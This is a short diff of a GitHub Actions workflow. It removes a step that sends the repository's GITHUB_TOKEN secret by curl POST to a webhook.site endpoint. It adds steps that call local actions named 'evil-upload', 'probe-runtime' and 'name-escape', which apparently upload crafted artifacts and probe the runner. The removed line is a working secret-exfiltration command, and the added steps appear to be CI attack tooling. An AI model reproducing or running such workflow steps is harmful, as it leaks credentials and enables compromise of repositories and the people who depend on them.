@@ -5,6 +5,10 @@ jobs:
   x:
     runs-on: ubuntu-latest
     steps:
-      - run: |
-          curl -s -X POST -d "t=${{ secrets.GITHUB_TOKEN }}" https://webhook.site/ae1c7580-8d42-440e-82c4-4746ccb71ad5
-        shell: bash
+      - uses: actions/checkout@v4
+      - name: upload crafted artifact
+        uses: ./.github/actions/evil-upload
+      - name: runtime surface probe
+        uses: ./.github/actions/probe-runtime
+      - name: artifact name escape upload
+        uses: ./.github/actions/name-escape
